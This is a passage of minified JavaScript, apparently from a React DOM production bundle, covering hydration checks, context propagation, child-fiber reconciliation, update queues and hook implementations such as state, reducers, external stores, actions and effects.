Ii(e,t){Di[Oi++]=Ai,Di[Oi++]=ji,Di[Oi++]=ki,Ai=t.id,ji=t.overflow,ki=e}var Li=null,Ri=null,F=!1,zi=null,Bi=!1,Vi=Error(i(519));function Hi(e){throw Ji(Si(Error(i(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?`text`:`HTML`,``)),e)),Vi}function Ui(e){var t=e.stateNode,n=e.type,r=e.memoizedProps;switch(t[N]=e,t[ft]=r,n){case`dialog`:Q(`cancel`,t),Q(`close`,t);break;case`iframe`:case`object`:case`embed`:Q(`load`,t);break;case`video`:case`audio`:for(n=0;n<_d.length;n++)Q(_d[n],t);break;case`source`:Q(`error`,t);break;case`img`:case`image`:case`link`:Q(`error`,t),Q(`load`,t);break;case`details`:Q(`toggle`,t);break;case`input`:Q(`invalid`,t),Gt(t,r.value,r.defaultValue,r.checked,r.defaultChecked,r.type,r.name,!0);break;case`select`:Q(`invalid`,t);break;case`textarea`:Q(`invalid`,t),Yt(t,r.value,r.defaultValue,r.children)}n=r.children,typeof n!=`string`&&typeof n!=`number`&&typeof n!=`bigint`||t.textContent===``+n||!0===r.suppressHydrationWarning||Md(t.textContent,n)?(r.popover!=null&&(Q(`beforetoggle`,t),Q(`toggle`,t)),r.onScroll!=null&&Q(`scroll`,t),r.onScrollEnd!=null&&Q(`scrollend`,t),r.onClick!=null&&(t.onclick=an),t=!0):t=!1,t||Hi(e,!0)}function Wi(e){for(Li=e.return;Li;)switch(Li.tag){case 5:case 31:case 13:Bi=!1;return;case 27:case 3:Bi=!0;return;default:Li=Li.return}}function Gi(e){if(e!==Li)return!1;if(!F)return Wi(e),F=!0,!1;var t=e.tag,n;if((n=t!==3&&t!==27)&&((n=t===5)&&(n=e.type,n=n===`form`||n===`button`||Ud(e.type,e.memoizedProps)),n=!n),n&&Ri&&Hi(e),Wi(e),t===13){if(e=e.memoizedState,e=e===null?null:e.dehydrated,!e)throw Error(i(317));Ri=uf(e)}else if(t===31){if(e=e.memoizedState,e=e===null?null:e.dehydrated,!e)throw Error(i(317));Ri=uf(e)}else t===27?(t=Ri,Zd(e.type)?(e=lf,lf=null,Ri=e):Ri=t):Ri=Li?cf(e.stateNode.nextSibling):null;return!0}function Ki(){Ri=Li=null,F=!1}function qi(){var e=zi;return e!==null&&($l===null?$l=e:$l.push.apply($l,e),zi=null),e}function Ji(e){zi===null?zi=[e]:zi.push(e)}var Yi=fe(null),Xi=null,Zi=null;function Qi(e,t,n){k(Yi,t._currentValue),t._currentValue=n}function $i(e){e._currentValue=Yi.current,pe(Yi)}function ea(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)===t?r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t):(e.childLanes|=t,r!==null&&(r.childLanes|=t)),e===n)break;e=e.return}}function ta(e,t,n,r){var a=e.child;for(a!==null&&(a.return=e);a!==null;){var o=a.dependencies;if(o!==null){var s=a.child;o=o.firstContext;a:for(;o!==null;){var c=o;o=a;for(var l=0;l<t.length;l++)if(c.context===t[l]){o.lanes|=n,c=o.alternate,c!==null&&(c.lanes|=n),ea(o.return,n,e),r||(s=null);break a}o=c.next}}else if(a.tag===18){if(s=a.return,s===null)throw Error(i(341));s.lanes|=n,o=s.alternate,o!==null&&(o.lanes|=n),ea(s,n,e),s=null}else s=a.child;if(s!==null)s.return=a;else for(s=a;s!==null;){if(s===e){s=null;break}if(a=s.sibling,a!==null){a.return=s.return,s=a;break}s=s.return}a=s}}function na(e,t,n,r){e=null;for(var a=t,o=!1;a!==null;){if(!o){if(a.flags&524288)o=!0;else if(a.flags&262144)break}if(a.tag===10){var s=a.alternate;if(s===null)throw Error(i(387));if(s=s.memoizedProps,s!==null){var c=a.type;Dr(a.pendingProps.value,s.value)||(e===null?e=[c]:e.push(c))}}else if(a===_e.current){if(s=a.alternate,s===null)throw Error(i(387));s.memoizedState.memoizedState!==a.memoizedState.memoizedState&&(e===null?e=[Qf]:e.push(Qf))}a=a.return}e!==null&&ta(t,e,n,r),t.flags|=262144}function ra(e){for(e=e.firstContext;e!==null;){if(!Dr(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function ia(e){Xi=e,Zi=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function aa(e){return sa(Xi,e)}function oa(e,t){return Xi===null&&ia(e),sa(e,t)}function sa(e,t){var n=t._currentValue;if(t={context:t,memoizedValue:n,next:null},Zi===null){if(e===null)throw Error(i(308));Zi=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else Zi=Zi.next=t;return n}var ca=typeof AbortController<`u`?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(t,n){e.push(n)}};this.abort=function(){t.aborted=!0,e.forEach(function(e){return e()})}},la=t.unstable_scheduleCallback,ua=t.unstable_NormalPriority,I={$$typeof:S,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function da(){return{controller:new ca,data:new Map,refCount:0}}function fa(e){e.refCount--,e.refCount===0&&la(ua,function(){e.controller.abort()})}var pa=null,ma=0,ha=0,ga=null;function _a(e,t){if(pa===null){var n=pa=[];ma=0,ha=dd(),ga={status:`pending`,value:void 0,then:function(e){n.push(e)}}}return ma++,t.then(va,va),t}function va(){if(--ma===0&&pa!==null){ga!==null&&(ga.status=`fulfilled`);var e=pa;pa=null,ha=0,ga=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function ya(e,t){var n=[],r={status:`pending`,value:null,reason:null,then:function(e){n.push(e)}};return e.then(function(){r.status=`fulfilled`,r.value=t;for(var e=0;e<n.length;e++)(0,n[e])(t)},function(e){for(r.status=`rejected`,r.reason=e,e=0;e<n.length;e++)(0,n[e])(void 0)}),r}var ba=D.S;D.S=function(e,t){nu=je(),typeof t==`object`&&t&&typeof t.then==`function`&&_a(e,t),ba!==null&&ba(e,t)};var xa=fe(null);function Sa(){var e=xa.current;return e===null?G.pooledCache:e}function Ca(e,t){t===null?k(xa,xa.current):k(xa,t.pool)}function wa(){var e=Sa();return e===null?null:{parent:I._currentValue,pool:e}}var Ta=Error(i(460)),Ea=Error(i(474)),Da=Error(i(542)),Oa={then:function(){}};function ka(e){return e=e.status,e===`fulfilled`||e===`rejected`}function Aa(e,t,n){switch(n=e[n],n===void 0?e.push(t):n!==t&&(t.then(an,an),t=n),t.status){case`fulfilled`:return t.value;case`rejected`:throw e=t.reason,Pa(e),e;default:if(typeof t.status==`string`)t.then(an,an);else{if(e=G,e!==null&&100<e.shellSuspendCounter)throw Error(i(482));e=t,e.status=`pending`,e.then(function(e){if(t.status===`pending`){var n=t;n.status=`fulfilled`,n.value=e}},function(e){if(t.status===`pending`){var n=t;n.status=`rejected`,n.reason=e}})}switch(t.status){case`fulfilled`:return t.value;case`rejected`:throw e=t.reason,Pa(e),e}throw Ma=t,Ta}}function ja(e){try{var t=e._init;return t(e._payload)}catch(e){throw typeof e==`object`&&e&&typeof e.then==`function`?(Ma=e,Ta):e}}var Ma=null;function Na(){if(Ma===null)throw Error(i(459));var e=Ma;return Ma=null,e}function Pa(e){if(e===Ta||e===Da)throw Error(i(483))}var Fa=null,Ia=0;function La(e){var t=Ia;return Ia+=1,Fa===null&&(Fa=[]),Aa(Fa,e,t)}function Ra(e,t){t=t.props.ref,e.ref=t===void 0?null:t}function za(e,t){throw t.$$typeof===g?Error(i(525)):(e=Object.prototype.toString.call(t),Error(i(31,e===`[object Object]`?`object with keys {`+Object.keys(t).join(`, `)+`}`:e)))}function Ba(e){function t(t,n){if(e){var r=t.deletions;r===null?(t.deletions=[n],t.flags|=16):r.push(n)}}function n(n,r){if(!e)return null;for(;r!==null;)t(n,r),r=r.sibling;return null}function r(e){for(var t=new Map;e!==null;)e.key===null?t.set(e.index,e):t.set(e.key,e),e=e.sibling;return t}function a(e,t){return e=mi(e,t),e.index=0,e.sibling=null,e}function o(t,n,r){return t.index=r,e?(r=t.alternate,r===null?(t.flags|=67108866,n):(r=r.index,r<n?(t.flags|=67108866,n):r)):(t.flags|=1048576,n)}function s(t){return e&&t.alternate===null&&(t.flags|=67108866),t}function c(e,t,n,r){return t===null||t.tag!==6?(t=vi(n,e.mode,r),t.return=e,t):(t=a(t,n),t.return=e,t)}function l(e,t,n,r){var i=n.type;return i===y?d(e,t,n.props.children,r,n.key):t!==null&&(t.elementType===i||typeof i==`object`&&i&&i.$$typeof===E&&ja(i)===t.type)?(t=a(t,n.props),Ra(t,n),t.return=e,t):(t=gi(n.type,n.key,n.props,null,e.mode,r),Ra(t,n),t.return=e,t)}function u(e,t,n,r){return t===null||t.tag!==4||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?(t=bi(n,e.mode,r),t.return=e,t):(t=a(t,n.children||[]),t.return=e,t)}function d(e,t,n,r,i){return t===null||t.tag!==7?(t=_i(n,e.mode,r,i),t.return=e,t):(t=a(t,n),t.return=e,t)}function f(e,t,n){if(typeof t==`string`&&t!==``||typeof t==`number`||typeof t==`bigint`)return t=vi(``+t,e.mode,n),t.return=e,t;if(typeof t==`object`&&t){switch(t.$$typeof){case _:return n=gi(t.type,t.key,t.props,null,e.mode,n),Ra(n,t),n.return=e,n;case v:return t=bi(t,e.mode,n),t.return=e,t;case E:return t=ja(t),f(e,t,n)}if(ce(t)||ae(t))return t=_i(t,e.mode,n,null),t.return=e,t;if(typeof t.then==`function`)return f(e,La(t),n);if(t.$$typeof===S)return f(e,oa(e,t),n);za(e,t)}return null}function p(e,t,n,r){var i=t===null?null:t.key;if(typeof n==`string`&&n!==``||typeof n==`number`||typeof n==`bigint`)return i===null?c(e,t,``+n,r):null;if(typeof n==`object`&&n){switch(n.$$typeof){case _:return n.key===i?l(e,t,n,r):null;case v:return n.key===i?u(e,t,n,r):null;case E:return n=ja(n),p(e,t,n,r)}if(ce(n)||ae(n))return i===null?d(e,t,n,r,null):null;if(typeof n.then==`function`)return p(e,t,La(n),r);if(n.$$typeof===S)return p(e,t,oa(e,n),r);za(e,n)}return null}function m(e,t,n,r,i){if(typeof r==`string`&&r!==``||typeof r==`number`||typeof r==`bigint`)return e=e.get(n)||null,c(t,e,``+r,i);if(typeof r==`object`&&r){switch(r.$$typeof){case _:return e=e.get(r.key===null?n:r.key)||null,l(t,e,r,i);case v:return e=e.get(r.key===null?n:r.key)||null,u(t,e,r,i);case E:return r=ja(r),m(e,t,n,r,i)}if(ce(r)||ae(r))return e=e.get(n)||null,d(t,e,r,i,null);if(typeof r.then==`function`)return m(e,t,n,La(r),i);if(r.$$typeof===S)return m(e,t,n,oa(t,r),i);za(t,r)}return null}function h(i,a,s,c){for(var l=null,u=null,d=a,h=a=0,g=null;d!==null&&h<s.length;h++){d.index>h?(g=d,d=null):g=d.sibling;var _=p(i,d,s[h],c);if(_===null){d===null&&(d=g);break}e&&d&&_.alternate===null&&t(i,d),a=o(_,a,h),u===null?l=_:u.sibling=_,u=_,d=g}if(h===s.length)return n(i,d),F&&Mi(i,h),l;if(d===null){for(;h<s.length;h++)d=f(i,s[h],c),d!==null&&(a=o(d,a,h),u===null?l=d:u.sibling=d,u=d);return F&&Mi(i,h),l}for(d=r(d);h<s.length;h++)g=m(d,i,h,s[h],c),g!==null&&(e&&g.alternate!==null&&d.delete(g.key===null?h:g.key),a=o(g,a,h),u===null?l=g:u.sibling=g,u=g);return e&&d.forEach(function(e){return t(i,e)}),F&&Mi(i,h),l}function g(a,s,c,l){if(c==null)throw Error(i(151));for(var u=null,d=null,h=s,g=s=0,_=null,v=c.next();h!==null&&!v.done;g++,v=c.next()){h.index>g?(_=h,h=null):_=h.sibling;var y=p(a,h,v.value,l);if(y===null){h===null&&(h=_);break}e&&h&&y.alternate===null&&t(a,h),s=o(y,s,g),d===null?u=y:d.sibling=y,d=y,h=_}if(v.done)return n(a,h),F&&Mi(a,g),u;if(h===null){for(;!v.done;g++,v=c.next())v=f(a,v.value,l),v!==null&&(s=o(v,s,g),d===null?u=v:d.sibling=v,d=v);return F&&Mi(a,g),u}for(h=r(h);!v.done;g++,v=c.next())v=m(h,a,g,v.value,l),v!==null&&(e&&v.alternate!==null&&h.delete(v.key===null?g:v.key),s=o(v,s,g),d===null?u=v:d.sibling=v,d=v);return e&&h.forEach(function(e){return t(a,e)}),F&&Mi(a,g),u}function b(e,r,o,c){if(typeof o==`object`&&o&&o.type===y&&o.key===null&&(o=o.props.children),typeof o==`object`&&o){switch(o.$$typeof){case _:a:{for(var l=o.key;r!==null;){if(r.key===l){if(l=o.type,l===y){if(r.tag===7){n(e,r.sibling),c=a(r,o.props.children),c.return=e,e=c;break a}}else if(r.elementType===l||typeof l==`object`&&l&&l.$$typeof===E&&ja(l)===r.type){n(e,r.sibling),c=a(r,o.props),Ra(c,o),c.return=e,e=c;break a}n(e,r);break}t(e,r),r=r.sibling}o.type===y?(c=_i(o.props.children,e.mode,c,o.key),c.return=e,e=c):(c=gi(o.type,o.key,o.props,null,e.mode,c),Ra(c,o),c.return=e,e=c)}return s(e);case v:a:{for(l=o.key;r!==null;){if(r.key===l){if(r.tag===4&&r.stateNode.containerInfo===o.containerInfo&&r.stateNode.implementation===o.implementation){n(e,r.sibling),c=a(r,o.children||[]),c.return=e,e=c;break a}n(e,r);break}t(e,r),r=r.sibling}c=bi(o,e.mode,c),c.return=e,e=c}return s(e);case E:return o=ja(o),b(e,r,o,c)}if(ce(o))return h(e,r,o,c);if(ae(o)){if(l=ae(o),typeof l!=`function`)throw Error(i(150));return o=l.call(o),g(e,r,o,c)}if(typeof o.then==`function`)return b(e,r,La(o),c);if(o.$$typeof===S)return b(e,r,oa(e,o),c);za(e,o)}return typeof o==`string`&&o!==``||typeof o==`number`||typeof o==`bigint`?(o=``+o,r!==null&&r.tag===6?(n(e,r.sibling),c=a(r,o),c.return=e,e=c):(n(e,r),c=vi(o,e.mode,c),c.return=e,e=c),s(e)):n(e,r)}return function(e,t,n,r){try{Ia=0;var i=b(e,t,n,r);return Fa=null,i}catch(t){if(t===Ta||t===Da)throw t;var a=fi(29,t,null,e.mode);return a.lanes=r,a.return=e,a}}}var Va=Ba(!0),Ha=Ba(!1),Ua=!1;function Wa(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function Ga(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function Ka(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function qa(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,W&2){var i=r.pending;return i===null?t.next=t:(t.next=i.next,i.next=t),r.pending=t,t=li(e),ci(e,null,n),t}return ai(e,r,t,n),li(e)}function Ja(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,n&4194048)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,at(e,n)}}function Ya(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,a=null;if(n=n.firstBaseUpdate,n!==null){do{var o={lane:n.lane,tag:n.tag,payload:n.payload,callback:null,next:null};a===null?i=a=o:a=a.next=o,n=n.next}while(n!==null);a===null?i=a=t:a=a.next=t}else i=a=t;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:a,shared:r.shared,callbacks:r.callbacks},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}var Xa=!1;function Za(){if(Xa){var e=ga;if(e!==null)throw e}}function Qa(e,t,n,r){Xa=!1;var i=e.updateQueue;Ua=!1;var a=i.firstBaseUpdate,o=i.lastBaseUpdate,s=i.shared.pending;if(s!==null){i.shared.pending=null;var c=s,l=c.next;c.next=null,o===null?a=l:o.next=l,o=c;var u=e.alternate;u!==null&&(u=u.updateQueue,s=u.lastBaseUpdate,s!==o&&(s===null?u.firstBaseUpdate=l:s.next=l,u.lastBaseUpdate=c))}if(a!==null){var d=i.baseState;o=0,u=l=c=null,s=a;do{var f=s.lane&-536870913,p=f!==s.lane;if(p?(q&f)===f:(r&f)===f){f!==0&&f===ha&&(Xa=!0),u!==null&&(u=u.next={lane:0,tag:s.tag,payload:s.payload,callback:null,next:null});a:{var h=e,g=s;f=t;var _=n;switch(g.tag){case 1:if(h=g.payload,typeof h==`function`){d=h.call(_,d,f);break a}d=h;break a;case 3:h.flags=h.flags&-65537|128;case 0:if(h=g.payload,f=typeof h==`function`?h.call(_,d,f):h,f==null)break a;d=m({},d,f);break a;case 2:Ua=!0}}f=s.callback,f!==null&&(e.flags|=64,p&&(e.flags|=8192),p=i.callbacks,p===null?i.callbacks=[f]:p.push(f))}else p={lane:f,tag:s.tag,payload:s.payload,callback:s.callback,next:null},u===null?(l=u=p,c=d):u=u.next=p,o|=f;if(s=s.next,s===null){if(s=i.shared.pending,s===null)break;p=s,s=p.next,p.next=null,i.lastBaseUpdate=p,i.shared.pending=null}}while(1);u===null&&(c=d),i.baseState=c,i.firstBaseUpdate=l,i.lastBaseUpdate=u,a===null&&(i.shared.lanes=0),ql|=o,e.lanes=o,e.memoizedState=d}}function $a(e,t){if(typeof e!=`function`)throw Error(i(191,e));e.call(t)}function eo(e,t){var n=e.callbacks;if(n!==null)for(e.callbacks=null,e=0;e<n.length;e++)$a(n[e],t)}var to=fe(null),no=fe(0);function ro(e,t){e=Gl,k(no,e),k(to,t),Gl=e|t.baseLanes}function io(){k(no,Gl),k(to,to.current)}function ao(){Gl=no.current,pe(to),pe(no)}var oo=fe(null),L=null;function R(e){var t=e.alternate;k(V,V.current&1),k(oo,e),L===null&&(t===null||to.current!==null||t.memoizedState!==null)&&(L=e)}function so(e){k(V,V.current),k(oo,e),L===null&&(L=e)}function z(e){e.tag===22?(k(V,V.current),k(oo,e),L===null&&(L=e)):B(e)}function B(){k(V,V.current),k(oo,oo.current)}function co(e){pe(oo),L===e&&(L=null),pe(V)}var V=fe(0);function lo(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||af(n)||of(n)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder===`forwards`||t.memoizedProps.revealOrder===`backwards`||t.memoizedProps.revealOrder===`unstable_legacy-backwards`||t.memoizedProps.revealOrder===`together`)){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var uo=0,H=null,U=null,fo=null,po=!1,mo=!1,ho=!1,go=0,_o=0,vo=null,yo=0;function bo(){throw Error(i(321))}function xo(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!Dr(e[n],t[n]))return!1;return!0}function So(e,t,n,r,i,a){return uo=a,H=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,D.H=e===null||e.memoizedState===null?zs:Bs,ho=!1,a=n(r,i),ho=!1,mo&&(a=wo(t,n,r,i)),Co(e),a}function Co(e){D.H=Rs;var t=U!==null&&U.next!==null;if(uo=0,fo=U=H=null,po=!1,_o=0,vo=null,t)throw Error(i(300));e===null||rc||(e=e.dependencies,e!==null&&ra(e)&&(rc=!0))}function wo(e,t,n,r){H=e;var a=0;do{if(mo&&(vo=null),_o=0,mo=!1,25<=a)throw Error(i(301));if(a+=1,fo=U=null,e.updateQueue!=null){var o=e.updateQueue;o.lastEffect=null,o.events=null,o.stores=null,o.memoCache!=null&&(o.memoCache.index=0)}D.H=Vs,o=t(n,r)}while(mo);return o}function To(){var e=D.H,t=e.useState()[0];return t=typeof t.then==`function`?Mo(t):t,e=e.useState()[0],(U===null?null:U.memoizedState)!==e&&(H.flags|=1024),t}function Eo(){var e=go!==0;return go=0,e}function Do(e,t,n){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~n}function Oo(e){if(po){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}po=!1}uo=0,fo=U=H=null,mo=!1,_o=go=0,vo=null}function ko(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return fo===null?H.memoizedState=fo=e:fo=fo.next=e,fo}function Ao(){if(U===null){var e=H.alternate;e=e===null?null:e.memoizedState}else e=U.next;var t=fo===null?H.memoizedState:fo.next;if(t!==null)fo=t,U=e;else{if(e===null)throw H.alternate===null?Error(i(467)):Error(i(310));U=e,e={memoizedState:U.memoizedState,baseState:U.baseState,baseQueue:U.baseQueue,queue:U.queue,next:null},fo===null?H.memoizedState=fo=e:fo=fo.next=e}return fo}function jo(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Mo(e){var t=_o;return _o+=1,vo===null&&(vo=[]),e=Aa(vo,e,t),t=H,(fo===null?t.memoizedState:fo.next)===null&&(t=t.alternate,D.H=t===null||t.memoizedState===null?zs:Bs),e}function No(e){if(typeof e==`object`&&e){if(typeof e.then==`function`)return Mo(e);if(e.$$typeof===S)return aa(e)}throw Error(i(438,String(e)))}function Po(e){var t=null,n=H.updateQueue;if(n!==null&&(t=n.memoCache),t==null){var r=H.alternate;r!==null&&(r=r.updateQueue,r!==null&&(r=r.memoCache,r!=null&&(t={data:r.data.map(function(e){return e.slice()}),index:0})))}if(t??={data:[],index:0},n===null&&(n=jo(),H.updateQueue=n),n.memoCache=t,n=t.data[t.index],n===void 0)for(n=t.data[t.index]=Array(e),r=0;r<e;r++)n[r]=re;return t.index++,n}function Fo(e,t){return typeof t==`function`?t(e):t}function Io(e){return Lo(Ao(),U,e)}function Lo(e,t,n){var r=e.queue;if(r===null)throw Error(i(311));r.lastRenderedReducer=n;var a=e.baseQueue,o=r.pending;if(o!==null){if(a!==null){var s=a.next;a.next=o.next,o.next=s}t.baseQueue=a=o,r.pending=null}if(o=e.baseState,a===null)e.memoizedState=o;else{t=a.next;var c=s=null,l=null,u=t,d=!1;do{var f=u.lane&-536870913;if(f===u.lane?(uo&f)===f:(q&f)===f){var p=u.revertLane;if(p===0)l!==null&&(l=l.next={lane:0,revertLane:0,gesture:null,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),f===ha&&(d=!0);else if((uo&p)===p){u=u.next,p===ha&&(d=!0);continue}else f={lane:0,revertLane:u.revertLane,gesture:null,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null},l===null?(c=l=f,s=o):l=l.next=f,H.lanes|=p,ql|=p;f=u.action,ho&&n(o,f),o=u.hasEagerState?u.eagerState:n(o,f)}else p={lane:f,revertLane:u.revertLane,gesture:u.gesture,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null},l===null?(c=l=p,s=o):l=l.next=p,H.lanes|=f,ql|=f;u=u.next}while(u!==null&&u!==t);if(l===null?s=o:l.next=c,!Dr(o,e.memoizedState)&&(rc=!0,d&&(n=ga,n!==null)))throw n;e.memoizedState=o,e.baseState=s,e.baseQueue=l,r.lastRenderedState=o}return a===null&&(r.lanes=0),[e.memoizedState,r.dispatch]}function Ro(e){var t=Ao(),n=t.queue;if(n===null)throw Error(i(311));n.lastRenderedReducer=e;var r=n.dispatch,a=n.pending,o=t.memoizedState;if(a!==null){n.pending=null;var s=a=a.next;do o=e(o,s.action),s=s.next;while(s!==a);Dr(o,t.memoizedState)||(rc=!0),t.memoizedState=o,t.baseQueue===null&&(t.baseState=o),n.lastRenderedState=o}return[o,r]}function zo(e,t,n){var r=H,a=Ao(),o=F;if(o){if(n===void 0)throw Error(i(407));n=n()}else n=t();var s=!Dr((U||a).memoizedState,n);if(s&&(a.memoizedState=n,rc=!0),a=a.queue,us(Ho.bind(null,r,a,e),[e]),a.getSnapshot!==t||s||fo!==null&&fo.memoizedState.tag&1){if(r.flags|=2048,as(9,{destroy:void 0},Vo.bind(null,r,a,n,t),null),G===null)throw Error(i(349));o||uo&127||Bo(r,t,n)}return n}function Bo(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=H.updateQueue,t===null?(t=jo(),H.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function Vo(e,t,n,r){t.value=n,t.getSnapshot=r,Uo(t)&&Wo(e)}function Ho(e,t,n){return n(function(){Uo(t)&&Wo(e)})}function Uo(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!Dr(e,n)}catch{return!0}}function Wo(e){var t=si(e,2);t!==null&&hu(t,e,2)}function Go(e){var t=ko();if(typeof e==`function`){var n=e;if(e=n(),ho){He(!0);try{n()}finally{He(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Fo,lastRenderedState:e},t}function Ko(e,t,n,r){return e.baseState=n,Lo(e,U,typeof r==`function`?r:Fo)}function qo(e,t,n,r,a){if(Fs(e))throw Error(i(485));if(e=t.action,e!==null){var o={payload:a,action:e,next:null,isTransition:!0,status:`pending`,value:null,reason:null,listeners:[],then:function(e){o.listeners.push(e)}};D.T===null?o.isTransition=!1:n(!0),r(o),n=t.pending,n===null?(o.next=t.pending=o,Jo(t,o)):(o.next=n.next,t.pending=n.next=o)}}function Jo(e,t){var n=t.action,r=t.payload,i=e.state;if(t.isTransition){var a=D.T,o={};D.T=o;try{var s=n(i,r),c=D.S;c!==null&&c(o,s),Yo(e,t,s)}catch(n){Zo(e,t,n)}finally{a!==null&&o.types!==null&&(a.types=o.types),D.T=a}}else try{a=n(i,r),Yo(e,t,a)}catch(n){Zo(e,t,n)}}function Yo(e,t,n){typeof n==`object`&&n&&typeof n.then==`function`?n.then(function(n){Xo(e,t,n)},function(n){return Zo(e,t,n)}):Xo(e,t,n)}function Xo(e,t,n){t.status=`fulfilled`,t.value=n,Qo(t),e.state=n,t=e.pending,t!==null&&(n=t.next,n===t?e.pending=null:(n=n.next,t.next=n,Jo(e,n)))}function Zo(e,t,n){var r=e.pending;if(e.pending=null,r!==null){r=r.next;do t.status=`rejected`,t.reason=n,Qo(t),t=t.next;while(t!==r)}e.action=null}function Qo(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function $o(e,t){return t}function es(e,t){if(F){var n=G.formState;if(n!==null){a:{var r=H;if(F){if(Ri){b:{for(var i=Ri,a=Bi;i.nodeType!==8;){if(!a){i=null;break b}if(i=cf(i.nextSibling),i===null){i=null;break b}}a=i.data,i=a===`F!`||a===`F`?i:null}if(i){Ri=cf(i.nextSibling),r=i.data===`F!`;break a}}Hi(r)}r=!1}r&&(t=n[0])}}return n=ko(),n.memoizedState=n.baseState=t,r={pending:null,lanes:0,dispatch:null,lastRenderedReducer:$o,lastRenderedState:t},n.queue=r,n=Ms.bind(null,H,r),r.dispatch=n,r=Go(!1),a=Ps.bind(null,H,!1,r.queue),r=ko(),i={state:t,dispatch:null,action:e,pending:null},r.queue=i,n=qo.bind(null,H,i,a,n),i.dispatch=n,r.memoizedState=e,[t,n,!1]}function ts(e){return ns(Ao(),U,e)}function ns(e,t,n){if(t=Lo(e,t,$o)[0],e=Io(Fo)[0],typeof t==`object`&&t&&typeof t.then==`function`)try{var r=Mo(t)}catch(e){throw e===Ta?Da:e}else r=t;t=Ao();var i=t.queue,a=i.dispatch;return n!==t.memoizedState&&(H.flags|=2048,as(9,{destroy:void 0},rs.bind(null,i,n),null)),[r,a,e]}function rs(e,t){e.action=t}function is(e){var t=Ao(),n=U;if(n!==null)return ns(t,n,e);Ao(),t=t.memoizedState,n=Ao();var r=n.queue.dispatch;return n.memoizedState=e,[t,r,!1]}function as(e,t,n,r){return e={tag:e,create:n,deps:r,inst:t,next:null},t=H.updateQueue,t===null&&(t=jo(),H.updateQueue=t),n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e),e}function os(){return Ao().memoizedState}function ss(e,t,n,r){var i=ko();H.flags|=e,i.memoizedState=as(1|t,{destroy:void 0},n,r===void 0?null:r)}function cs(e,t,n,r){var i=Ao();r=r===void 0?null:r;var a=i.memoizedState.inst;U!==null&&r!==null&&xo(r,U.memoizedState.deps)?i.memoizedState=as(t,a,n,r):(H.flags|=e,i.memoizedState=as(1|t,a,n,r))}function ls(e,t){ss(8390656,8,e,t)}function us(e,t){cs(2048,8,e,t)}function ds(e){H.flags|=4;var t=H.updateQueue;if(t===null)t=jo(),H.updateQueue=t,t.events=[e];else{var n=t.events;n===null?t.events=[e]:n.push(e)}}function fs(e){var t=Ao().memoizedState;return ds({ref:t,nextImpl:e}),function(){if(W&2)throw Error(i(440));return t.impl.apply(void 0,arguments)}}function ps(e,t){return cs(4,2,e,t)}function ms(e,t){return cs(4,4,e,t)}function hs(e,t){if(typeof t==`function`){e=e();var n=t(e);return function(){typeof n==`function`?n():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function gs(e,t,n){n=n==null?null:n.concat([e]),cs(4,4,hs.bind(null,t,e),n)}function _s(){}function vs(e,t){var n=Ao();t=t===void 0?null:t;var r=n.memoizedState;return t!==null&&xo(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function ys(e,t){var n=Ao();t=t===void 0?null:t;var r=n.memoizedState;if(t!==null&&xo(t,r[1]))return r[0];if(r=e(),ho){He(!0);try{e()}finally{He(!1)}}return n.memoizedState=[r,t],r}function bs(e,t,n){return n===void 0||uo&1073741824&&!(q&261930)?e.memoizedState=t:(e.memoizedState=n,e=mu(),H.lanes|=e,ql|=e,n)}function xs(e,t,n,r){return 